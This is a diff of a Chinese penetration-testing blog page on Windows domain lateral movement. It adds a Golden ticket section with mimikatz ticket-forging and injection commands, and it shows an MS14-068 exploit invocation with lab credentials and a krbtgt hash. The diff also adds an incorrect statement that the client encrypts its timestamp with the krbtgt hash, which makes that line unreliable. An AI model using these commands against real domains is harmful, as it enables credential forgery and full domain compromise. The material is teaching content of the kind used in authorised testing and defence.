@@ -31,7 +31,13 @@
 <meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-1.png">
 <meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-3.png">
 <meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-4.png">
-<meta property="og:updated_time" content="2018-10-21T08:33:31.111Z">
+<meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-5.png">
+<meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-6.png">
+<meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-7.png">
+<meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-8.png">
+<meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-9.png">
+<meta property="og:image" content="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-10.png">
+<meta property="og:updated_time" content="2018-10-22T03:45:42.819Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="域渗透之横向移动">
 <meta name="twitter:description" content="域渗透之横向移动最近在根据ATT&amp;amp;CK提供的攻击矩阵梳理一些手法，趁着这个机会把自己的知识梳理一下，今天写一下横向移动常见的攻击手法。在攻击过程中，尽量不使用msf等集成攻击框架,尽量会把我理解的横向移动的手法总结全面。文章持久更新。">
@@ -242,7 +248,7 @@
 <p><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/pth-9.png" alt=""><br>p-t-h就到这里了～</p>
 <h2 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title="pass-the-ticket"></a>pass-the-ticket</h2><p>ptt攻击的部分就不是简单的ntlm认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：<em>MS14-068</em>,<em>Golden ticket</em>,<em>SILVER TICKET</em>.<br>之前介绍了Kerberos协议具体工作方法，在域中，简要介绍一下：</p>
 <ul>
-<li>客户机将明文密码进行ntlm哈希,然后和时间戳一起加密，发送给kdc（域控）,kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</li>
+<li>客户机将明文密码进行ntlm哈希,然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc（域控）,kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</li>
 <li>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中tgt数据</li>
 <li>然后客户机将tgt发送给域控制器KDC请求TGS（票证授权服务）票证，并且对tgt进行检测</li>
 <li>检测成功之后，将目标服务账户的ntlm以及tgt进行加密，将加密后的结果返回给客户机。<h3 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h3><blockquote>
@@ -254,6 +260,16 @@
 <p>利用过程：<br>1.whoami/user 得到普通域用户的sid<br><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-2.png" alt=""><br>2.执行payload生成ccache:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MS14<span class="number">-068.</span>exe -u yifan@test.local -s S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-4173655609</span><span class="number">-916892889</span><span class="number">-516531421</span><span class="number">-1108</span> -d dc<span class="number">-01.</span>test.local -p A100b200</div></pre></td></tr></table></figure></p>
 <p><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-1.png" alt=""><br>3.使用mimikatz注入凭据:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">kerberos</span>::purge #清空当前机器存在的凭证</div><div class="line"><span class="attribute">kerberos</span>::ptc <span class="attribute">y</span>:\downloads\TGT_yifan<span class="variable">@test</span>.local.ccache</div></pre></td></tr></table></figure></p>
 <p>显示Injecting ticket : OK就表示注入成功了～<br>4.查看注入是否成功并且登录域控：<br>查看klist:<br><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-3.png" alt=""><br>发现已经将凭证注入进去了～下面可以使用net use进行登录，或者使用psexec,wmi等方法进行远程执行命令。注意，这里登录时，要使用机器名，不要使用IP，否则没办法攻击成功。<br><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-4.png" alt=""></p>
+<h3 id="Golden-ticket-黄金凭据"><a href="#Golden-ticket-黄金凭据" class="headerlink" title="Golden ticket(黄金凭据)"></a>Golden ticket(黄金凭据)</h3><p>Golden ticket的作用是可以生成任意用户的tgt,那么问题就来了,是什么条件能膏让他生成任意用户的tgt呢？还得要看kerberos认证的过程,在windows认证过程中，客户端将自己的信息发送给KDC,然后KDC使用krbtgt用户密码的hash作为密钥进行加密，生成TGT。<br>那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。<strong>因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门</strong><br><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-5.png" alt=""><br>伪造黄金凭据需要具备下面条件：</p>
+<ul>
+<li>krbtgt用户的hash(就意味着你已经有域控制器权限了)</li>
+<li>域名称</li>
+<li>域的SID值</li>
+<li>要伪造的用户名</li>
+</ul>
+<p>先登录域控制器，dump krbtgt用户的hash值,获取域sid：<br><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-6.png" alt=""><br>切换到普通域用户的机器，生成tgt凭证,用户名为administrator:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">mimikatz</span> # <span class="selector-tag">kerberos</span><span class="selector-pseudo">::golden</span> /<span class="selector-tag">user</span><span class="selector-pseudo">:administrator</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:test.local</span> /<span class="selector-tag">sid</span><span class="selector-pseudo">:S-1-5-21-4173655609-916892889-516531421</span> /<span class="selector-tag">krbtgt</span><span class="selector-pseudo">:4c7f31c8a46406c43c397d5b6223ff27</span> /<span class="selector-tag">ticket</span><span class="selector-pseudo">:test.kirbi</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-7.png" alt=""><br>然后使用mimi将凭证注入进去,攻击成功:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mimikatz # kerberos::ptt test.kirbi</div></pre></td></tr></table></figure></p>
+<p><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-8.png" alt=""><br><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-9.png" alt=""><br>使用wmic.vbs进行登录：<br><img src="http://xnianq.cn/2018/10/16/域渗透之横向移动/ptt-10.png" alt=""></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
 <li><a href="https://www.anquanke.com/post/id/159959" target="_blank" rel="external">https://www.anquanke.com/post/id/159959</a></li>
 <li><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/" target="_blank" rel="external">https://klionsec.github.io/2016/08/10/ntlm-kerberos/</a></li>
